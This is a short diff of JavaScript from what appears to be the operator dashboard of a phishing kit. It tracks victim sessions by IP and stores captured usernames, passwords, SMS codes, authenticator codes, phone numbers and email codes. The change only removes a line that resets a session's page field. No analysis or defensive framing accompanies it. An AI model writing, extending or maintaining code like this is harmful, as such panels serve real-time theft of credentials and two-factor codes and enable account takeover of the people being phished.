@@ -558,7 +558,7 @@ const clientDataTypeMap = {
       sessionsData[sid] = sessionsData[sid] || { ip, identifier: '', password: '', status: 'online', sms: '', gauth: '', phoneNumber: '', emailCode: '', page: '' };
       sessionsData[sid].status = 'online';
       sessionsData[sid].ip = ip;
-      sessionsData[sid].page = '';
+      
       const existing = document.getElementById(`session-${sid}`);
       if (!existing) {
         const sessionBox = createSessionBox(sid, ip);
